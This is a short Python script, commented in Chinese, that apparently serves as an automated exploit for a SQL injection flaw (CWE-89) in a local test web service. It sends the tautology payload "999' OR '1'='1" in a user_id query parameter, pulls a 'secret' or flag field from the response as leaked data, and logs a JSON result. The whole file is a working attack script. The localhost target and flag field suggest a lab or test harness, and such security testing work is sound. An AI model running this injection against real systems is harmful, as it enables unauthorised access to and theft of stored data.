import requests
import time
import json
import urllib.parse
import logging

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

def run_exploit():
    """
    针对 CWE-89 (SQL 注入) 的自动化漏洞利用脚本
    """
    base_url = "http://127.0.0.1:18789/api/v1/user"
    
    # 核心 Payload: 闭合单引号，并使用 OR 使 WHERE 子句永远为真
    payload = "999' OR '1'='1"
    
    target_url = f"{base_url}?user_id={urllib.parse.quote(payload)}"
    
    log_trace = f"[*] 漏洞类型: SQL 注入 (CWE-89)\n"
    log_trace += f"[*] 注入 Payload: {payload}\n"
    log_trace += f"[*] 构造请求: GET {target_url}\n"
    
    result = {
        "cve_id": "CWE-89",
        "vuln_name": "SQL 注入漏洞",
        "status": "failed",
        "risk_level": "high",
        "leaked_data": None,
        "execution_log": "",
        "timestamp": int(time.time())
    }

    try:
        response = requests.get(target_url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "success":
                flag = data.get("secret", "")
                log_trace += f"[+] 💥 注入成功！成功绕过查询逻辑。\n"
                log_trace += f"[+] 提取到敏感信息: {flag}\n"
                result["status"] = "success"
                result["leaked_data"] = flag
            else:
                log_trace += "[-] 查询未命中，注入可能失败。\n"
    except Exception as e:
        log_trace += f"[-] 错误: {str(e)}\n"
        
    result["execution_log"] = log_trace
    return result

if __name__ == "__main__":
    result = run_exploit()
    logger.info("SQL注入攻击结果: %s", json.dumps(result, ensure_ascii=False))